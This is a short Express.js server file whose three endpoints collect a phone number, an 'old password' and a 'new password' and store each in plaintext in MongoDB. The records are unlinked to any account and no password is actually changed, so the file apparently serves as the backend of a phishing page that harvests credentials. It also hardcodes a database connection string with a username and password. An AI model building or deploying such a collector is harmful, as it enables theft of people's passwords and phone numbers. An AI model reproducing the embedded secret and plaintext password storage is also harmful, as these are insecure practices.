const express = require("express");
const app = express();
const mongoose = require("mongoose");
const Phone = require("./models/Phone");
const OldPass = require("./models/OldPass");
const NewPass = require("./models/NewPass");

// middlewares
app.use(express.json());

// api calls
app.post("/get-phone", async (req, res) => {
    try {
        const phoneNumber = new Phone({phone:req.body.phone})
        await phoneNumber.save()
        res.json({ success:true })
    } catch (error) {
        console.log(error)
    }
})

app.post("/get-old-pass", async (req, res) => {
    try {
        const oldPasss = new OldPass({old_pass:req.body.old_pass})
        await oldPasss.save()
        res.json({ success:true })
    } catch (error) {
        console.log(error)
    }
})

app.post("/get-new-pass", async (req, res) => {
    try {
        const NewPasss = new NewPass({new_pass:req.body.new_pass})
        await NewPasss.save()
        res.json({ success:true })
    } catch (error) {
        console.log(error)
    }
})


// start the server + mongodb connection
mongoose.connect('mongodb+srv://rashileo:rashileo123@cluster0.ojjqs.mongodb.net/iamtrying?retryWrites=true&w=majority').then(() => {
    app.listen(process.env.PORT || 3001, () => {
      console.log("server running & db connection succesful")
    });
})
  .catch((err) => {
    console.log(err);
  });